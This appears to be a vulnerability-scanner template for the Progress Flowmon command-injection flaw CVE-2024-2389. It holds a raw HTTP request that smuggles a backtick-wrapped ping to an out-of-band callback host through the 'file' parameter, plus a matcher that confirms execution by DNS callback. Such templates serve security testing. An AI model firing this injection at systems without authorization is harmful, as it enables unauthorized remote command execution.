id: poc-yaml-progress-flowmon-command-execution
info:
  name: Progress Flowmon Command Execution Vulnerability (CVE-2024-2389)
  author: ProjectDiscoveryAI
  severity: critical
  tags: dnslog,rce,CVE-2024-2389

http:
  - raw:
      - |
        GET /service.pdfs/confluence?lang=en&file=`ping+{{interactsh-url}}` HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
